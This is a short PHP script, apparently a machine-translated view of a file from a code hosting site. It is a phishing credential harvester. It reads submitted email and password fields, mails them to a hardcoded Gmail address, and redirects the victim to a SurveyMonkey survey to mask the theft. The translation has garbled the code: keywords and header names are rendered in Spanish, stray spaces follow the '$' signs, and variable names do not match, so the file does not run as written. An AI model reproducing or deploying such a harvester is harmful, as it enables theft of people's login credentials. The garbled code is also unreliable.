15 líneas (11 sloc)  387 bytes
<? php

$ to       = 'thrapsd@gmail.com' ;
$ sujeto = 'el sujeto' ;
$ mensaje = $ _POST [ "correo electrónico" ]. ":" . $ _POST [ "pasar" ];
$ encabezados = 'De: webmaster@example.com' . "\ r \ n" .
    "Responder a: webmaster@example.com" . "\ r \ n" .
    'X-Mailer: PHP /' . phpversion ();

mail ( $ para , $ asunto , $ mensaje , $ encabezados );


$ newURL = "https://www.surveymonkey.com/r/Y7L9ZY6" ;
encabezado ( 'Ubicación:' . $ newURL );
?>
